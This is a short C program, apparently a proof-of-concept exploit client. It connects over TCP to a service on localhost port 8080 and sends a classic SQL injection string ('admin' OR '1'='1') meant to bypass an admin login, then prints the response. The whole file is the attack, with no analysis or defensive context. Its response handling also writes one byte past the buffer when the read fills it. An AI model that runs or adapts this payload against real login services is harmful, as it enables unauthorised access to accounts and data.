#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 8080
#define BUFFER_SIZE 2048

int main() {
    int sock = 0;
    struct sockaddr_in serv_addr;
    char buffer[BUFFER_SIZE] = {0};
    
    // Create socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("\n Socket creation error \n");
        return -1;
    }
    
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);
    
    // Convert IPv4 and IPv6 addresses from text to binary form
    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
        printf("\nInvalid address/ Address not supported \n");
        return -1;
    }
    
    // Connect to server
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        printf("\nConnection Failed \n");
        return -1;
    }
    
    // Prepare the SQL injection payload
    const char *payload = "login:admin' OR '1'='1,anything";
    printf("Sending payload: %s\n", payload);
    
    // Send the payload
    send(sock, payload, strlen(payload), 0);
    printf("Payload sent\n");
    
    // Read the response
    int bytes_received = read(sock, buffer, BUFFER_SIZE);
    if (bytes_received > 0) {
        buffer[bytes_received] = '\0';
        printf("Received response: %s\n", buffer);
    } else {
        printf("No response received\n");
    }
    
    close(sock);
    return 0;
} 